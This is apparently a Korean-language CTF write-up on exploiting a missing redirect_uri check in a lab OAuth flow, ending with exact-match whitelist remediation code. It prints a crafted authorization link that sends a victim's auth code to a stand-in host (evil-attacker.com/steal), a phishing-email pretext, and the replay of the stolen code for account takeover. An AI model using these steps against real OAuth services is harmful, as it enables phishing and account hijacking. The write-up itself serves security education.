+++
title = "VulnABLE CTF [LUXORA] Write-up: OAuth Misconfiguration 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "OAuth", "Bronze", "Redirect URI", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: OAuth Misconfiguration 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (OAuth Misconfig)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/oauth/bronze`
- **목표**: 소셜 로그인(SSO)에 사용되는 OAuth 2.0 프로토콜에서 가장 흔하게 발생하는 **'Redirect URI 검증 누락'** 취약점을 악용하여, 타겟 사용자(피해자)의 인가 코드(Authorization Code)를 탈취하고 계정에 접근하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/oauth/bronze` 페이지는 외부 인증 제공자(예: 'Luxora Auth Server')를 통한 소셜 로그인 버튼을 제공합니다. 
버튼을 클릭하면 로그인 창으로 넘어가는데, 이때 브라우저의 주소창 URL을 자세히 분석해 봅니다.

**[OAuth 인증 요청 URL (정상)]**
```http
https://auth.luxora.test/authorize
?client_id=luxora_app_123
&response_type=code
&redirect_uri=http://localhost:3000/oauth/bronze/callback
&state=random_state_string
```

**[해커의 사고 과정]**
1. 사용자가 저 링크를 클릭해서 로그인을 성공하면, 인증 서버(`auth.luxora.test`)는 사용자를 `redirect_uri` 파라미터에 적힌 주소로 보낸다.
2. 이때 URL 파라미터로 매우 중요한 열쇠인 `?code=인증코드값` 을 붙여서 넘겨준다.
3. 만약 내가 저 `redirect_uri`를 내가 통제하는 해커 서버 주소로 슬쩍 바꾼 악성 링크를 만들어서 피해자에게 보낸다면?
4. 인증 서버가 해커 서버 주소가 올바른지(Whitelist에 있는지) 검사하지 않으면, 중요한 인증 코드가 해커 서버로 쏙 들어오게 될 것이다! (Open Redirect)

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(redirect_uri=attacker.com)--> [ OAuth Server ]
                                              |-- Redirects Victim with Auth Code
[ Victim ]   --(Sends Auth Code)------------> [ Attacker Server ]
```


이 취약점은 OAuth 2.0 아키텍처에서 인증 서버(Authorization Server)가 **`redirect_uri` 의 유효성을 엄격하게 검증하지 않을 때** 발생합니다.

### 💡 피싱 링크(Phishing Link) 제작
해커는 자신의 서버 도메인(예: `evil-attacker.com`)으로 코드가 전달되도록 URL을 조작합니다.

**[조작된 악성 링크]**
```http
https://auth.luxora.test/authorize
?client_id=luxora_app_123
&response_type=code
&redirect_uri=http://evil-attacker.com/steal
&state=random_state_string
```

해커는 이 링크를 "시스템 업데이트 공지" 같은 이메일로 위장하여 피해자(관리자 등)에게 발송합니다.

---

## 🚀 3. 공격 수행 및 토큰 탈취

### Step 1. 피해자의 로그인
피해자가 해커의 링크를 클릭합니다. 화면에는 정상적인 `auth.luxora.test` 로그인 창이 뜹니다. 도메인이 진짜이므로 의심 없이 아이디와 비밀번호를 치고 로그인합니다.

### Step 2. 인증 코드 유출 (Code Exfiltration)
로그인에 성공한 인증 서버는 URL에 적혀있던 `redirect_uri`로 사용자를 리다이렉트합니다.
하지만 그 주소는 해커의 서버입니다.

해커의 `evil-attacker.com` 웹 서버 로그에 다음과 같은 기록이 남습니다.
```text
[GET Request Received]
/steal?code=AUTH_CODE_xyz789&state=random_state_string
Source IP: [피해자의 IP]
```

### Step 3. 인증 코드 사용 (Account Takeover)
해커는 훔쳐낸 `code=AUTH_CODE_xyz789`를 가지고, 원래 애플리케이션인 `http://localhost:3000/oauth/bronze/callback` 주소에 직접 접근합니다.

```http
GET /oauth/bronze/callback?code=AUTH_CODE_xyz789&state=random_state_string
```

### 🔍 서버의 응답
애플리케이션(LUXORA)은 코드가 올바르다고 판단하고, 해커에게 해당 피해자의 세션 쿠키와 플래그를 발급합니다.

```html
<div class="dashboard">
  <h2>OAuth Authentication Successful!</h2>
  <p>Logged in as: victim@luxora.test</p>
  <p class="flag">FLAG{OAUTH_🥉_REDIRECT_BYPASS_A1B2C3}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

OAuth의 구조를 파악하고, 파라미터 중 데이터를 전달받는 '목적지(`redirect_uri`)'를 임의로 조작하여 중간에서 인증 티켓을 낚아채는(Interception) 전형적인 공격을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{OAUTH_🥉_REDIRECT_BYPASS_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
인증 서버가 클라이언트 애플리케이션(RP)이 등록될 때 약속된(Registered) 콜백 URL을 확인하지 않고, 요청(Request)에 적힌 URL을 그대로 신뢰하여 리다이렉트 시킨 것이 원인입니다.

* **안전한 패치 가이드 (엄격한 Whitelisting)**
OAuth 제공자(서버)를 구현할 때, 클라이언트 개발자로부터 사전에 사용할 `redirect_uri` 목록을 등록받아야 합니다.
그리고 인증 요청이 들어올 때마다 파라미터로 넘어온 URI가 등록된 목록과 **문자열 하나 안 틀리고 정확히 일치하는지(Exact Match)** 검증해야 합니다.

```javascript
// 인증 서버의 방어 로직 예시
const registeredURIs = ["http://localhost:3000/oauth/bronze/callback", "https://www.luxora.test/callback"];
const requestedURI = req.query.redirect_uri;

if (!registeredURIs.includes(requestedURI)) {
    return res.status(400).send("Invalid redirect_uri.");
}
// 검증 통과 시에만 로그인 진행 및 리다이렉트 허용
```
이렇게 하면 해커가 `evil-attacker.com`을 파라미터에 넣었을 때, 인증 서버 단계에서 즉시 차단되어 공격이 무효화됩니다.